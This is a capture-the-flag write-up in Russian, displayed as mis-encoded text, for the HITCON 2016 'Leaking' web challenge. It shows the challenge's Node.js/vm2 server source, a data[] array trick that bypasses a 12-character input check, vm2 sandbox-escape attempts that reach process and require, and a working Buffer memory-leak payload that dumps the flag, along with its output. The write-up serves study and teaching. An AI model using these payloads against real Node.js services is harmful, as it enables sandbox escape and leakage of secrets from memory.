## LEAKING +200 HITCON 2016 Web  (–†–∞–∑–±–æ—Ä –ø–æ–ª—É—á–µ–Ω–∏—è —Ñ–ª–∞–≥–∞)

–£—Å–ª–æ–≤–∏–µ –∑–∞–¥–∞—á–∏:

```
Category: reverse Points: 200 Solves: Description:

Remote Code Execution! http://52.198.115.130:3000/
```

–≠—Ç–æ –ø–æ–∂–∞–ª—É–π —Å–∞–º–∞—è –∏–Ω—Ç–µ—Ä–µ—Å–Ω–∞—è –∑–∞–¥–∞—á–∞, –∫–æ—Ç–æ—Ä—É—é —è –Ω–µ —Ä–µ—à–∏–ª –∏–∑ –∑–∞ –æ—Ç—Å—É—Ç—Å—Ç–≤–∏—è –≤—Ä–µ–º–µ–Ω–∏, –ø–æ—Ç–æ–º—É —è –ø–æ—Å–º–æ—Ç—Ä–µ–ª –∫–∞–∫ —ç—Ç–æ —Å–¥–µ–ª–∞–ª–∏ –¥—Ä—É–≥–∏–µ —É—á–∞—Å—Ç–Ω–∏–∫–∏ —ç—Ç–æ–≥–æ –∑–∞–º–µ—á–∞—Ç–µ–ª—å–Ω–æ–≥–æ CTF. 

–í–æ—Ç –∏—Å—Ö–æ–¥–Ω—ã–π –∫–æ–¥, –∫–æ—Ç–æ—Ä—ã–π –æ—Ç–æ–±—Ä–∞–∂–∞–µ—Ç—Å—è, –ø—Ä–∏ –ø–µ—Ä–µ—Ö–æ–¥–µ –ø–æ —Å—Å—ã–ª–∫–µ –≤ —Ç–µ–ª–µ –∑–∞–¥–∞–Ω–∏—è:

```javascript
"use strict";

var randomstring = require("randomstring");
var express = require("express");
var {VM} = require("vm2");
var fs = require("fs");

var app = express();
var flag = require("./config.js").flag

app.get("/", function (req, res) {
    res.header("Content-Type", "text/plain");

    /*    Orange is so kind so he put the flag here. But if you can guess correctly :P    */
    eval("var flag_" + randomstring.generate(64) + " = \"hitcon{" + flag + "}\";");
    if (req.query.data && req.query.data.length <= 12) {
        var vm = new VM({
            timeout: 1000
        });
        console.log(req.query.data);
        res.send("eval ->" + vm.run(req.query.data));
    } else {
        res.send(fs.readFileSync(__filename).toString());
    }
});

app.listen(3000, function () {
    console.log("listening on port 3000!");
});
```

–í–∏–¥–∏–º, —á—Ç–æ —Ç—É—Ç –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è VM2 –∏ –∏—Å–ø–æ–ª–Ω–∏–µ –∫–æ–¥–∞ –≤ –ø–µ—Å–æ—á–Ω–∏—Ü–µ, –º–¥–∞, –Ω–µ –∑—Ä—è —ç—Ç—É –∑–∞–¥–∞—á—É Orange –¥–æ–±–∞–≤–∏–ª. –ö–∞–∫ —Ç–æ –∑–Ω–∞—á–∏—Ç –º–æ–∂–Ω–æ –≤—ã–π—Ç–∏ –∑–∞ –ø—Ä–µ–¥–µ–ª—ã –ø–µ—Å–æ—á–Ω–∏—Ü—ã :). –°—Ä–∞–∑—É –≤—Å–ø–æ–º–Ω–∏–ª–∏—Å—å –±–∞–≥–∏ –≤ –±—Ä–∞—É–∑–µ—Ä–µ IE —Å VBScript –∫–æ–≥–¥–∞ —Å—Ç–∞–ª–∞ –≤–æ–∑–º–æ–∂–Ω—ã–º –ø—Ä–∏ –ø–æ–º–æ—â–∏ —Å—Ç—Ä–µ–π —Å—Ç–µ–∫–∞ –∏ –º–∞–Ω–∏–ø—É–ª—è—Ü–∏–π —Å —Ç–∏–ø–∞–º–∏ —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Ñ–ª–∞–≥ –æ–ø—Ä–µ–¥–µ–ª—è—â–∏–π –±–µ–∑–æ–ø–∞—Å–Ω–æ–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–π –≤ –±—Ä–∞—É–∑–µ—Ä–µ –≤ —Å–æ—Å—Ç–æ—è–Ω–∏–µ —Ä–∞–∑—Ä–µ—à–∞—é—â–µ–µ –≤—Å–µ —á—Ç–æ –±—ã–ª–æ –º–æ–∂–Ω–æ –≤ –æ–±—ã—á–Ω–æ–º VBScript –∫–æ–¥–µ –≤–Ω–µ –±—Ä–∞—É–∑–µ—Ä–∞. –ù–æ —Ç—É—Ç Node.js –∏ –Ω–∞–≤–µ—Ä–Ω—è–∫–∞ –¥—Ä—É–≥–∞—è –∏—Å—Ç–æ—Ä–∏—è. 

–ü–µ—Ä–≤–æ–µ —á—Ç–æ –±—Ä–æ—Å–∞–µ—Ç—Å—è –≤ –≥–ª–∞–∑–∞ —ç—Ç–æ –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ –¥–ª–∏–Ω—ã –¥–∞–Ω–Ω—ã—Ö, –æ–Ω–∞ –Ω–µ –º–æ–∂–µ—Ç –ø—Ä–µ–≤—ã—à–∞—Ç—å 12 —Å–∏–º–≤–æ–ª–æ–≤. –•–º –Ω–æ –≤ 12 —Å–∏–º–≤–æ–ª–æ–≤ –Ω–∞–¥–æ –µ—â–µ –ø–æ—Å—Ç–∞—Ä–∞—Ç—å—Å—è —á—Ç–æ —Ç–æ —Ç–∞–∫–æ–µ –≤–ø–∏—Ö–Ω—É—Ç—å, –∫–æ—Ä–æ—Ç–∫–æ–µ, —á—Ç–æ–±—ã –ø—Ä–æ—à–ª–æ (–≤ –≥–æ–ª–æ–≤–µ —Å—Ä–∞–∑—É –Ω–∞—á–∞–ª–∏ –∫—Ä—É—Ç–∏—Ç—å—Å—è –º—ã—Å–ª–∏ —Å –º–∞–Ω–∏–ø—É–ª—è—Ü–∏—è–º–∏ –≤ –ø–µ—Ä–µ–¥–∞—á–µ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤ —Å—Ç—Ä–æ–∫–∏). –¢–∞–∫ –≤–æ—Ç, —Ä–∞–∑ —ç—Ç–æ Node.js —Ç–∞–º JavaScript, –∞ –º—ã –∑–Ω–∞–µ–º, —á—Ç–æ –º–∞—Å—Å–∏–≤ –≤ JS —è–≤–ª—è–µ—Ç—Å—è –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–º —ç–ª–µ–º–µ–Ω—Ç–æ–≤, –ø–æ—Ç–æ–º—É –≤ JSON –ø–µ—Ä–µ–¥–∞—á–∞ [] –º–æ–∂–µ—Ç –≤—ã–ø–æ–ª–Ω–∏—Ç—å –∫–æ–¥ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—ã–π –∑–∞–ø–∏—Å–∞–Ω–Ω—ã–π –≤ –Ω–µ–º. –í–æ—Ç –∫ –ø—Ä–∏–º–µ—Ä—É, –º—ã –º–æ–∂–µ–º –≤—ã–ø–æ–ª–Ω–∏—Ç—å —Ç–∞–∫–æ–π –∫–æ–¥ `[console.log("Hello!")]` –∏ –ø–æ–ª—É—á–∏–º –≤ –∫–æ–Ω—Å–æ–ª–µ –≤—ã–≤–æ–¥ `Hello!` –¢–∞–∫ –≤–æ—Ç –≤–µ—Ä–Ω–µ–º—Å—è –∫ –Ω–∞—à–∏–º –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º –≤ —Å—Ç—Ä–æ–∫–µ. –î–ª—è –ø–µ—Ä–µ–¥–∞—á–∏ –¥–∞–Ω–Ω—ã—Ö —Å–µ—Ä–≤–µ—Ä—É –Ω—É–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –ø–∞—Ä–∞–º–µ—Ç—Ä data - —ç—Ç–æ –≤–∏–¥–Ω–æ –∏–∑ —Å–ª–µ–¥—É—é—â–µ–π —Å—Ç—Ä–æ–∫–∏:

```javascript
if (req.query.data && req.query.data.length <= 12) {
```

–¢–∞–∫ –≤–æ—Ç —á—Ç–æ–±—ã –ø—Ä–µ–æ–¥–∞–ª–µ—Ç—å —ç—Ç–æ –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ –Ω–∞–º –Ω—É–∂–Ω–æ –≤–æ—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è —ç—Ç–∏–º –º–æ–º–µ–Ω—Ç–æ–º –∏ –Ω–µ —Å—Ç—Ä–∞—à–Ω–æ —á—Ç–æ –Ω–∞—à –∫–æ–¥ –±—É–¥–µ—Ç –≤–Ω—É—Ç—Ä–∏ –º–∞—Å—Å–∏–≤–∞, –æ–Ω –≤—ã–ø–æ–ª–Ω–∏—Ç—Å—è –≤—Å–µ —Ä–∞–≤–Ω–æ, –Ω–æ –º—ã –ø—Ä–∏ —ç—Ç–æ–º –ø—Ä–µ–æ–¥–∞–ª–µ–≤–∞–µ–º –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ `req.query.data.length <= 12` —Ç–∞–∫ –∫–∞–∫ –¥–ª–∏–Ω–∞ –Ω–∞—à–µ–≥–æ –º–∞—Å—Å–∏–≤–∞ –±—É–¥–µ—Ç 1 –∏–±–æ –º—ã –∏—Å–ø–æ–ª—å–∑—É–µ–º –ª–∏—à—å –æ–¥–∏–Ω —ç–ª–µ–º–µ–Ω—Ç –º–∞—Å—Å–∏–≤–∞ –∏ —Ç—É—Ç —É–∂–µ –±—É–¥–µ—Ç –±—Ä–∞—Ç—å—Å—è –¥–ª–∏–Ω–∞ –º–∞—Å—Å–∏–≤–∞. –ü—Ä–æ–≤–µ—Ä–∏–º —ç—Ç–æ —É—Ç—Ä–≤–µ—Ä–∂–¥–µ–Ω–∏–µ, –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–ª–µ–¥—É—é—â–∏–µ –¥–∞–Ω–Ω—ã–µ:

```
http://localhost:3000/?data[]=%22Very%20very%20looooooooooog%20striiiiiiiiinnnnnggggg!!!!%20AAAAAAAAAAAAAAAAAAAAAAAAA%22
```

–•–∞ —Ö–∞! –†–∞–±–æ—Ç–∞–µ—Ç! –ò –ø—Ä–∏ —ç—Ç–æ–º –ø–æ–ª—É—á–µ–º –≤—ã–≤–æ–¥:

```
eval ->Very very looooooooooog striiiiiiiiinnnnnggggg!!!! AAAAAAAAAAAAAAAAAAAAAAAAA
```

–ù—É –µ—â–µ –¥–ª—è —É—Å–ø–æ–∫–æ–µ–Ω–∏—è –º–æ–∂–Ω–æ –≤—ã–ø–æ–ª–Ω–∏—Ç—å —á—Ç–æ —Ç–æ –∫–æ–¥–æ–º. –ö –ø—Ä–∏–º–µ—Ä—É:

```javascript
(function a(){var a="";for(var i=0;i<=10;i++){a+="test " + i + "\n";}return a;})()
```

–û—Ç–ø—Ä–∞–≤—è–µ–º –≤ –±—Ä–∞—É–∑–µ—Ä–µ —Ç–∞–∫–æ–π –≤–æ—Ç –∑–∞–ø—Ä–æ—Å:

```
http://localhost:3000/?data[]=%28function%20a%28%29{var%20a%3D%22%22%3Bfor%28var%20i%3D0%3Bi%3C%3D10%3Bi%2B%2B%29{a%2B%3D%22test%20%22%20%2B%20i%20%2B%20%22\n%22%3B}return%20a%3B}%29%28%29
```

–ü–æ–ª—É—á–∞–µ–º –≤—ã–≤–æ–¥:

```
eval ->test 0
test 1
test 2
test 3
test 4
test 5
test 6
test 7
test 8
test 9
test 10
```

–¢–∞–∫ —Ç–∞–∫ :) –ó–Ω–∞—á–∏—Ç –≤—Å–µ —Ä–∞–±–æ—Ç–∞–µ—Ç –∏ —Ç–µ–ø–µ—Ä—å –º—ã –º–æ–∂–µ–º –≤–Ω–µ–¥—Ä—è—Ç—å –∫–æ–¥ –ª—é–±–æ–π –¥–ª–∏–Ω–Ω—ã –Ω–µ –ø—Ä–µ–∂–∏–≤–∞—è –æ –ø—Ä–æ–≤–µ—Ä–∫–µ –≤ 12 —Å–∏–º–≤–æ–ª–æ–≤. –≠—Ç–æ –Ω–∞—Å –Ω–µ –æ—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç —Ç–µ–ø–µ—Ä—å.

–û—Å—Ç–∞–µ—Ç—Å—è –ø–æ–Ω—è—Ç—å –∫–∞–∫ –∂–µ –±—ã—Ç—å –¥–∞–ª—å—à–µ. –í –∏—Ç–æ–≥–µ –ø–æ—Å–ª–µ –≥—É–≥–ª–µ–Ω–∏—è, –≤—ã–¥–µ–ª—è—é –Ω–µ—Å–∫–æ–ª—å–∫–æ —Å—Å—ã–ª–æ–∫, —Å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–µ–π –æ –±–∞–≥–∞—Ö –∏ –æ–±—Ö–æ–¥–∞—Ö –ø–µ—Å–æ—á–Ω–∏—Ü—ã –≤ VM2 (https://github.com/patriksimek/vm2/issues/32). 

–ü—Ä–æ–±—É–µ–º –ø—Ä–∏–º–µ–Ω–∏—Ç—å –ø–æ–¥—Ö–æ–¥—ã –∫–æ—Ç–æ—Ä—ã–µ –æ–ø–∏—Å–∞–Ω—ã –≤ —ç—Ç–æ–º —Ç–∏–∫–µ—Ç–µ. –ö –ø—Ä–∏–º–µ—Ä—É –ø–æ–ø—Ä–æ–±—É–µ–º –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–ª–µ–¥—É—é—â—É—é —Å—Ç—Ä–æ–∫—É:

```javascript
global.constructor.constructor('return this')().constructor.constructor('return process')()
```

–í –∏—Ç–æ–≥–µ –ø–æ–ª—É—á–∞–µ—Ç—Å—è —Å–ª–µ–¥—É—é—â–∏–π –∑–∞–ø—Ä–æ—Å:

```
http://localhost:3000/?data[]=global.constructor.constructor%28%27return%20this%27%29%28%29.constructor.constructor%28%27return%20process%27%29%28%29
```

–ò –æ—Ç–≤–µ—Ç:

```
ReferenceError: process is not defined
   at eval (eval at <anonymous> (vm.js:1:61), <anonymous>:2:8)
   at vm.js:1:90
   at ContextifyScript.Script.runInContext (vm.js:35:29)
   at VM.run (/root/HITCON/node_modules/vm2/lib/main.js:119:52)
   at /root/HITCON/server.js:21:33
   at Layer.handle [as handle_request] (/root/HITCON/node_modules/express/lib/router/layer.js:95:5)
   at next (/root/HITCON/node_modules/express/lib/router/route.js:131:13)
   at Route.dispatch (/root/HITCON/node_modules/express/lib/router/route.js:112:3)
   at Layer.handle [as handle_request] (/root/HITCON/node_modules/express/lib/router/layer.js:95:5)
   at /root/HITCON/node_modules/express/lib/router/index.js:277:22 
```

–•–º –Ω–µ —Ä–∞–±–æ—Ç–∞–µ—Ç. –ü—Ä–æ–±—É–µ–º –µ—â–µ —á—Ç–æ –Ω–∏—Ç—å –≤ —ç—Ç–æ–º —Å–º—ã—Å–ª–µ:

```javascript
'use strict';
const {VM} = require('vm2');
const vm = new VM();
vm.run(`
    /*function getParent(o) {
        return o.constructor.constructor('return this')();
    }*/
     
    function getParent(o) {
        return o.__proto__.constructor.constructor('return this')();
    }

    function exploit(o) {
        const foreignFunction = o.constructor.constructor;
        const process = foreignFunction('return process')();
        const require = process.mainModule.require;
        const console = require('console');
        const fs = require('fs');

        console.log('\u{1F60E} ', fs.statSync('.'), '\u{1F60E}');

        return o;
    }

    (function () {
        exploit(getParent(getParent(arguments.callee.caller)));
    })();
`);
```

–ù–æ –ø–æ–ª—É—á–∞–ª —á—Ç–æ —Ç–æ –ø–æ–¥–æ–±–∏–µ:

```
/root/HITCON/node_modules/vm2/lib/main.js:125
			throw this._internal.Decontextify.value(e);
			^
TypeError: Cannot read property 'constructor' of null
    at getParent (vm.js:3:17)
    at vm.js:19:27
    at vm.js:20:7
    at ContextifyScript.Script.runInContext (vm.js:35:29)
    at VM.run (/root/HITCON/node_modules/vm2/lib/main.js:119:52)
    at Object.<anonymous> (/root/HITCON/exploit.js:7:4)
    at Module._compile (module.js:556:32)
    at Object.Module._extensions..js (module.js:565:10)
    at Module.load (module.js:473:32)
    at tryModuleLoad (module.js:432:12)
```

–∏ 

```
/root/HITCON/node_modules/vm2/lib/main.js:125
			throw this._internal.Decontextify.value(e);
			^
TypeError: Cannot read property '__proto__' of null
    at getParent (vm.js:7:17)
    at vm.js:23:27
    at vm.js:24:7
    at ContextifyScript.Script.runInContext (vm.js:35:29)
    at VM.run (/root/HITCON/node_modules/vm2/lib/main.js:119:52)
    at Object.<anonymous> (/root/HITCON/exploit.js:7:4)
    at Module._compile (module.js:556:32)
    at Object.Module._extensions..js (module.js:565:10)
    at Module.load (module.js:473:32)
    at tryModuleLoad (module.js:432:12)
```

–í –æ–±—â–µ–º –Ω–µ –ø–æ–ª—É—á–∞–µ—Ç—Å—è –æ–±–æ–π—Ç–∏ —Å—ç–Ω–¥–±–æ–∫—Å —Ç–∞–∫–º–∏–º–∏ –º–µ—Ç–æ–¥–∞–º–∏ –Ω–µ –ø–æ–ª—É—á–∏—Ç—Å—è. –¢–æ–≥–¥–∞ –Ω—É–∂–Ω–æ –∏—Å–∫–∞—Ç—å –¥–∞–ª—å—à–µ. –í –∏—Ç–æ–≥–µ –ø–æ—Å–ª–µ –Ω–µ–∫–æ—Ç–æ—Ä–æ–≥–æ –≥—É–≥–ª–µ–Ω–∏—è –Ω–∞—Ç—ã–∫–∞–µ—à—å—Å—è –Ω–∞ —Å—Å—ã–ª–∫–∏:

* https://github.com/nodejs/node/issues/4660 
* https://github.com/ChALkeR/notes/blob/master/Buffer-knows-everything.md

–ü–æ–ª—É—á–∞–µ—Ç—Å—è —á—Ç–æ Buffer –≤ Node.js –ª–∏–∫–∞–µ—Ç –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –ø–æ —Ç–∞–∫–æ–º—É –∂–µ –ø—Ä–∏–Ω—Ü–∏–ø—É –∫–∞–∫ HeartBleed. –ê –≤—Å–µ –∏–∑-–∑–∞ —Ç–æ–≥–æ —á—Ç–æ –≤ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–µ —Å–æ–∑–¥–∞–Ω–∏—è –Ω–æ–≤–æ–≥–æ –æ–±—ä–µ–∫—Ç–∞ Buffer –≤ Node.js –ø–∞–º—è—Ç—å –≤—ã–¥–µ–ª—è–µ–º–∞—è –ø–æ–¥ –Ω–µ–≥–æ –Ω–µ –æ–±–Ω—É–ª—è–µ—Ç—Å—è –∏ –Ω–µ –∑–∞–ø–æ–ª–Ω—è–µ—Ç—Å—è –Ω—É–ª—è–º–∏, —á—Ç–æ–±—ã –∏—Å–∫–ª—é—á–∏—Ç—å –≤—ã–¥–∞—á—É –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏, –∫–æ—Ç–æ—Ä–∞—è —Ä–∞–Ω–µ–µ —Å–æ–¥–µ—Ä–∂–∞–ª–∞—Å—å –≤ —ç—Ç–æ–π –æ–±–ª–∞—Å—Ç–∏ –ø–∞–º—è—Ç–∏. –¢–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º –∑–Ω–∞—á–∏—Ç –º–æ–∂–Ω–æ –ø–æ–ø—ã—Ç–∞—Ç—å—Å—è –∫–∞–∫–æ–µ —Ç–æ –∫–æ–ª-–≤–æ —Ä–∞–∑ –≤—ã–¥–µ–ª—è—Ç—å –±—É—Ñ–µ—Ä –æ–¥–Ω–æ–≥–æ –∏ —Ç–æ–≥–æ –∂–µ —Ä–∞–∑–º–µ—Ä–∞ –∏ –ø—Ä–∏ —ç—Ç–æ–º —Å–º–æ—Ç—Ä–µ—Ç—å –Ω–∞–ª–∏—á–∏–µ –≤ –Ω–µ–º —Å—Ç—Ä–æ–∫–∏ `hitcon{`  —ç—Ç–æ –Ω–∞—á–∞–ª–æ —Ñ–ª–∞–≥–∞, –¥–ª—è —ç—Ç–æ–≥–æ CTF.

–û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–ª–µ–¥—É—é—â–∏–π –∑–∞–ø—Ä–æ—Å –≤ –±—Ä–∞—É–∑–µ—Ä–µ:

```javascript
localhost:3000/?data[]=for (var step = 0; step < 100000; step++) {var buf = (new Buffer(1024)).toString('ascii');if (buf.indexOf("hitcon{") !== -1) {break;}}buf;
```

–ò –ø–æ–ª—É—á–∞–µ–º –≤ –æ—Ç–≤–µ—Ç, –ø–æ—Å–ª–µ –Ω–µ—Å–∫–æ–ª—å–∫–∏—Ö –æ—Ç–ø—Ä–∞–≤–æ–∫ –ø–æ—Å—Ä–µ–¥—Å—Ç–≤–æ–º Enter –≤ —Å—Ç—Ä–æ–∫–µ –±—Ä–∞—É–∑–µ—Ä–∞: 

```
eval ->ÔøΩÔøΩÔøΩI:ÔøΩÔøΩÔøΩÔøΩ<ÔøΩÔøΩÔøΩARIzxmuÔøΩÔøΩÔøΩ0/FÔøΩÔøΩÔøΩÔøΩ(b}ÔøΩÔøΩÔøΩÔøΩu~h3ÔøΩÔøΩÔøΩ w'ÔøΩÔøΩÔøΩÔøΩ {'ÔøΩÔøΩÔøΩÔøΩbGÔøΩ8uevalÔøΩÔøΩH90/FÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ`l}ÔøΩÔøΩÔøΩXw'ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ6[B
uÔøΩÔøΩ0@FÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ8x'ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩEHÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ0/FÔøΩÔøΩÔøΩÔøΩ8b}ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩHw'ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ(ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ0@FÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ8x'ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ8x'ÔøΩÔøΩÔøΩÔøΩq'ÔøΩÔøΩÔøΩÔøΩ(w'ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩm}ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩuÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩH	XFÔøΩÔøΩÔøΩÔøΩq'ÔøΩÔøΩÔøΩÔøΩPw'ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩH9pcÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩP5FÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ_ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩy'ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ(ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ|'ÔøΩÔøΩÔøΩÔøΩflag_NlxPt3SGbmVO7n6yNbdUX6ZK8nixjChwEWJ3SwPnzPXBsjs8ujiEPkpll0NGi4eG}ÔøΩ0/FÔøΩÔøΩÔøΩÔøΩ0LyÔøΩÔøΩÔøΩÔøΩy'ÔøΩÔøΩÔøΩÔøΩy'ÔøΩÔøΩÔøΩÔøΩEÔøΩÔøΩÔøΩÔøΩ5Hl5u(:evalÔøΩÔøΩÔøΩÔøΩ0/FÔøΩÔøΩÔøΩÔøΩ8LyÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩy'ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ6[B
ÔøΩiÔøΩargumentsÔøΩÔøΩÔøΩiÔøΩÔøΩ0/FÔøΩÔøΩÔøΩÔøΩ@LyÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ8y'ÔøΩÔøΩÔøΩÔøΩ	ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ
WuI:xm.resultÔøΩ0/FÔøΩÔøΩÔøΩÔøΩHLyÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩxy'ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ/ÔøΩÔøΩÔøΩG?ÔøΩÔøΩÔøΩÔøΩ0@FÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩPy'ÔøΩÔøΩÔøΩÔøΩIÔøΩÔøΩÔøΩhitcon{4nother h34rtbleed in n0dejs? or do u solved by other way?}&ÔøΩÔøΩÔøΩÔøΩ0/FÔøΩÔøΩÔøΩÔøΩPLyÔøΩÔøΩÔøΩÔøΩIFÔøΩÔøΩÔøΩÔøΩhz'ÔøΩÔøΩÔøΩÔøΩBÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ*JÔøΩÔøΩÔøΩÔøΩprototypez'ÔøΩÔøΩÔøΩÔøΩ0/FÔøΩÔøΩÔøΩÔøΩXLyÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ`z'ÔøΩÔøΩÔøΩÔøΩ
```

–ò —á—Ç–æ –º—ã –≤–∏–¥–∏–º! –ê –≤–∏–¥–∏–º –º—ã —Å—Ä–µ–¥–∏ –ø—Ä–æ—á–µ–≥–æ –º—É—Å–æ—Ä–∞ —Å–æ–¥–µ—Ä–∏–º–æ–µ —Ñ–ª–∞–≥–∞! 

````
hitcon{4nother h34rtbleed in n0dejs? or do u solved by other way?}
````

–ü—Ä–∏ —ç—Ç–æ–º —è –∑–∞–º–µ—Ç–∏–ª —á—Ç–æ –º–∞–ª–µ–Ω—å–∫–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ –±—É—Ñ–µ—Ä–∞ –ø—Ä–∏–≤–æ–¥–∏—Ç –∫ –±–æ–ª—å—à–µ–º—É –∫–æ–ª-–≤—É –æ—Ç–ø—Ä–∞–≤–æ–∫, —á—Ç–æ–±—ã –¥–æ–±–∏—Ç—å—Å—è —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞. –¢–∞–∫ —á—Ç–æ —Ä–∞–∑–º–µ—Ä –±—É—Ñ—Ñ–µ—Ä–∞ –Ω—É–∂–Ω–æ –ø–æ–¥–±–∏—Ä–∞—Ç—å —Å–∞–º–æ–º—É. 

–ü—Ä–∏ —ç—Ç–æ–º –≤–∏–¥–Ω–æ —Ä–∞–∑–ª–∏—á–Ω—ã–µ —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã –∏ –∫–æ–ª-–≤–æ –∑–∞–ø—Ä–æ—Å–æ–≤ —Ç–æ–∂–µ —Ä–∞–∑–Ω–∏—Ç—Å—è:

–ï—Å–ª–∏ –∏—Å–ø–æ–ª—å–∑—É–µ–º –±—É—Ñ—Ñ–µ—Ä 2048 –ø–æ–ª—É—á–∞–µ–º –≤—ã–≤–æ–¥:

![VirtualBox_Kali2016.2_16_10_2016_21_30_45](https://github.com/b1n4ry4rms/CTFs/blob/master/2016/hitcon_quals/leaking/imgs/VirtualBox_Kali2016.2_16_10_2016_21_30_45.png)

–ü—Ä–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–∏ –±—É—Ñ—Ñ–µ—Ä–∞ –≤ 1024 –±–∞–π—Ç–∞ –ø–æ–ª—É—á–∞–µ–º:

![VirtualBox_Kali2016.2_16_10_2016_21_09_42](https://github.com/b1n4ry4rms/CTFs/blob/master/2016/hitcon_quals/leaking/imgs/VirtualBox_Kali2016.2_16_10_2016_21_09_42.png)

–ü—Ä–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–∏ –±—É—Ñ–µ—Ä–∞ –≤ 200 –±–∞–π—Ç –∫–∞–∫ –ø—Ä–∏–≤–µ–¥–µ–Ω–æ –≤ —Å—Å—ã–ª–∫–µ, –ø—Ä–∏—Ö–æ–¥–∏—Ç—Å—è –Ω–µ –æ–¥–∏–Ω —Ä–∞–∑ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –∑–∞–ø—Ä–æ—Å –ø—Ä–µ–∂–¥–µ —á–µ–º –ø–æ–ª—É—á–∏—Ç—å –≤—ã–≤–æ–¥ —Ñ–ª–∞–≥–∞. 

![VirtualBox_Kali2016.2_16_10_2016_21_38_45](https://github.com/b1n4ry4rms/CTFs/blob/master/2016/hitcon_quals/leaking/imgs/VirtualBox_Kali2016.2_16_10_2016_21_38_45.png)

–ü—Ä–∏ —ç—Ç–æ–º –µ—Å–ª–∏ —á–∞—Å—Ç–æ –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å –∑–∞–ø—Ä–æ—Å—ã —Ç–æ VM –º–æ–∂–µ—Ç –≤—ã–¥–∞–≤–∞—Ç—å –æ—à–∏–±–∫–∏ timeout

```
Error: Script execution timed out.
    at Error (native)
    at ContextifyScript.Script.runInContext (vm.js:35:29)
    at VM.run (/root/HITCON/node_modules/vm2/lib/main.js:119:52)
    at /root/HITCON/server.js:21:33
